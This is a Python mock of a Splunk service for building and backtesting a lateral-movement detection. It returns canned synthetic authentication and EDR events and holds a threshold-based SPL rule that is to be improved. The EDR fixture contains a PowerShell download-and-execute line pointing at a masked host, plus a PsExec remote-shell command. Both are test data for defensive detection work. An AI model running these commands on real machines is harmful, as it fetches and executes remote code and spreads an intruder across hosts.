"""B4 — mock Splunk Service so Lane B builds with NO live Splunk (decoupled from Lane A).

Two jobs:
  1. Satisfy Agent.__aenter__, which calls
     service.get(path_segment='authentication/current-context', output_mode='json')
     to resolve the Splunk username (captured in the Day-0 spike).
  2. Provide jobs.oneshot(spl) returning canned rows for the seeded
     lateral-movement scenario, so SPL tools work before the trial is up.

At Lane-A merge (B5) this whole module is replaced by:
    from splunklib.client import connect
    service = connect(host=..., port=8089, token=...)
...with NO change to the agents or tools that consume it (same .jobs.oneshot API).
"""
from __future__ import annotations

import json
from typing import Any


# ---- Seeded synthetic lateral-movement scenario (the demo floor) ----
# A compromised service account 'svc_backup' pivots from WKS-014 across 8 hosts
# via SMB admin$ shares, after a suspicious PowerShell download on WKS-014.
SEED_AUTH_EVENTS: list[dict[str, Any]] = [
    {"_time": "2026-05-31T02:11:04Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "FS-01", "share": "admin$"},
    {"_time": "2026-05-31T02:11:47Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "FS-02", "share": "admin$"},
    {"_time": "2026-05-31T02:12:33Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "DC-01", "share": "admin$"},
    {"_time": "2026-05-31T02:13:58Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "APP-03", "share": "admin$"},
    {"_time": "2026-05-31T02:14:40Z", "index": "auth", "host": "WKS-014",
     "user": "svc_backup", "action": "logon", "logon_type": "3", "src": "WKS-014",
     "dest": "APP-04", "share": "admin$"},
]

# ---- Benign-but-noisy service accounts that TRIP the OLD rule (>3 distinct
# admin-share dests) but have NO correlated EDR attack-tool signal. These are the
# genuine FALSE POSITIVES the old flat-threshold rule fires on every night. The
# new EDR-correlated rule correctly drops them (no suspicious_download /
# remote_exec_tool on their origin host for that account), while still firing on
# svc_backup, which alone carries the attack-tool signal. This is what makes the
# backtest's FP-reduction real and non-zero (single source of truth for the live
# seed via generate_seed_csvs.py — zero drift).
SEED_BENIGN_FANOUT_AUTH: list[dict[str, Any]] = [
    # svc_patch — nightly patch deployment sweep, 4 admin$ dests, no EDR attack signal
    {"_time": "2026-05-31T00:20:03Z", "index": "auth", "host": "PATCH-01",
     "user": "svc_patch", "action": "logon", "logon_type": "3", "src": "PATCH-01",
     "dest": "FS-01", "share": "admin$"},
    {"_time": "2026-05-31T00:20:41Z", "index": "auth", "host": "PATCH-01",
     "user": "svc_patch", "action": "logon", "logon_type": "3", "src": "PATCH-01",
     "dest": "FS-02", "share": "admin$"},
    {"_time": "2026-05-31T00:21:19Z", "index": "auth", "host": "PATCH-01",
     "user": "svc_patch", "action": "logon", "logon_type": "3", "src": "PATCH-01",
     "dest": "APP-03", "share": "admin$"},
    {"_time": "2026-05-31T00:22:02Z", "index": "auth", "host": "PATCH-01",
     "user": "svc_patch", "action": "logon", "logon_type": "3", "src": "PATCH-01",
     "dest": "DC-01", "share": "admin$"},
    # svc_vuln — nightly authenticated vulnerability scan, 4 C$ dests, no EDR signal
    {"_time": "2026-05-31T00:45:10Z", "index": "auth", "host": "SCAN-02",
     "user": "svc_vuln", "action": "logon", "logon_type": "3", "src": "SCAN-02",
     "dest": "FS-01", "share": "C$"},
    {"_time": "2026-05-31T00:45:52Z", "index": "auth", "host": "SCAN-02",
     "user": "svc_vuln", "action": "logon", "logon_type": "3", "src": "SCAN-02",
     "dest": "FS-02", "share": "C$"},
    {"_time": "2026-05-31T00:46:33Z", "index": "auth", "host": "SCAN-02",
     "user": "svc_vuln", "action": "logon", "logon_type": "3", "src": "SCAN-02",
     "dest": "APP-04", "share": "C$"},
    {"_time": "2026-05-31T00:47:20Z", "index": "auth", "host": "SCAN-02",
     "user": "svc_vuln", "action": "logon", "logon_type": "3", "src": "SCAN-02",
     "dest": "WEB-05", "share": "C$"},
    # svc_monitor — extend the existing 2-dest baseline to 4 dests so it too trips
    # the old rule (a third genuine FP), still with no EDR attack signal.
    {"_time": "2026-05-31T01:30:00Z", "index": "auth", "host": "MON-03",
     "user": "svc_monitor", "action": "logon", "logon_type": "3", "src": "MON-03",
     "dest": "FS-01", "share": "C$"},
    {"_time": "2026-05-31T01:31:12Z", "index": "auth", "host": "MON-03",
     "user": "svc_monitor", "action": "logon", "logon_type": "3", "src": "MON-03",
     "dest": "FS-02", "share": "C$"},
    {"_time": "2026-05-31T01:32:05Z", "index": "auth", "host": "MON-03",
     "user": "svc_monitor", "action": "logon", "logon_type": "3", "src": "MON-03",
     "dest": "DC-01", "share": "C$"},
    {"_time": "2026-05-31T01:33:48Z", "index": "auth", "host": "MON-03",
     "user": "svc_monitor", "action": "logon", "logon_type": "3", "src": "MON-03",
     "dest": "APP-03", "share": "C$"},
]

SEED_EDR_EVENTS: list[dict[str, Any]] = [
    {"_time": "2026-05-31T02:08:12Z", "index": "edr", "host": "WKS-014",
     "user": "jdoe", "process": "powershell.exe",
     "cmdline": "powershell -enc <b64> IEX(New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')",
     "signal": "suspicious_download"},
    {"_time": "2026-05-31T02:10:55Z", "index": "edr", "host": "WKS-014",
     "user": "svc_backup", "process": "PsExec.exe",
     "cmdline": "PsExec.exe \\\\FS-01 -u svc_backup cmd", "signal": "remote_exec_tool"},
]

# The current (over-firing) detection that the Detection Engineer will improve.
SEED_CURRENT_DETECTION_SPL = (
    'index=auth action=logon logon_type=3\n'
    '| stats dc(dest) as distinct_dests by user\n'
    '| where distinct_dests > 3'
)


class _Resp:
    def __init__(self, body: str):
        self.body = body


class _Jobs:
    def oneshot(self, query: str, **kwargs) -> list[dict[str, Any]]:
        """Return canned rows keyed off the SPL. Real service returns a
        results reader; we return a list[dict] and the tools normalize either.
        """
        q = query.lower()
        if "index=auth" in q or "admin$" in q or "logon_type" in q:
            return list(SEED_AUTH_EVENTS) + list(SEED_BENIGN_FANOUT_AUTH)
        if "index=edr" in q or "powershell" in q or "process=" in q:
            return list(SEED_EDR_EVENTS)
        if "makeresults" in q:
            return [{"_time": "now", "count": "1"}]
        # default: union of both indexes for broad correlation queries
        return (
            list(SEED_AUTH_EVENTS)
            + list(SEED_BENIGN_FANOUT_AUTH)
            + list(SEED_EDR_EVENTS)
        )


class MockService:
    """Drop-in stand-in for splunklib.client.Service (mock-mode)."""

    def __init__(self, username: str = "sentinel-analyst"):
        self._username = username
        self.jobs = _Jobs()

    def get(self, path_segment: str, **kwargs) -> _Resp:
        if path_segment == "authentication/current-context":
            return _Resp(json.dumps({"entry": [{"content": {"username": self._username}}]}))
        return _Resp(json.dumps({"entry": []}))
